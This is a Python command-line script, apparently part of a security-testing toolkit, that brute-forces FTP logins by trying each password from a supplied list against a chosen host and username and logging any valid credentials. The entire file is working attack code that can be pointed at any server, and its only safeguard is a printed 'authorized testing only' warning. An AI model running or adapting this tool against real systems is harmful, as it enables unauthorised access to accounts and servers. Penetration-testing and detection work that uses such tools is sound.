#!/usr/bin/env python3
"""
FTP Brute Force Attack Simulation

Attempts to gain unauthorized access to FTP servers by systematically trying username/password combinations.

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os, sys, argparse
from ftplib import FTP
from typing import Dict, Any, List

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)


class FTPBruteForceAttack:
    """FTP brute force attack simulator."""

    def __init__(self, host: str, port: int, username: str, passwords: List[str], verbose: bool = False):
        self.host = host
        self.port = port
        self.username = username
        self.passwords = passwords
        self.verbose = verbose
        self.attempts = 0
        logger.info(f"Initialized FTP brute force attack on {host}:{port}")

    def try_login(self, password: str) -> bool:
        """Attempt FTP login with given password."""
        try:
            ftp = FTP()
            ftp.connect(self.host, self.port, timeout=5)
            ftp.login(self.username, password)
            ftp.quit()
            return True
        except Exception as e:
            if self.verbose:
                logger.debug(f"Failed with password '{password}': {e}")
            return False

    def execute(self) -> Dict[str, Any]:
        """Execute the brute force attack."""
        logger.info(f"Starting FTP brute force for user '{self.username}' with {len(self.passwords)} passwords")

        found_password = None

        try:
            for i, password in enumerate(self.passwords, 1):
                self.attempts += 1
                logger.info(f"Trying password {i}/{len(self.passwords)}: {password}")

                if self.try_login(password):
                    found_password = password
                    logger.info(f"SUCCESS! Valid credentials: {self.username}:{password}")
                    break

            if not found_password:
                logger.info("Brute force completed - no valid credentials found")

        except KeyboardInterrupt:
            logger.warning("Interrupted")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            stats = {
                "attempts": self.attempts,
                "success": found_password is not None,
                "password": found_password
            }
            return stats


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="FTP Brute Force Attack Simulation")
    parser.add_argument("-H", "--host", required=True, help="FTP server host")
    parser.add_argument("-p", "--port", type=int, default=21, help="FTP port")
    parser.add_argument("-u", "--username", required=True, help="Username to test")
    parser.add_argument("-P", "--passwords", required=True, help="Password list file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    return parser.parse_args()


def main():
    print("=" * 80)
    print("WARNING: For AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)
    try:
        args = parse_arguments()
        with open(args.passwords, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        attack = FTPBruteForceAttack(args.host, args.port, args.username, passwords, args.verbose)
        attack.execute()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
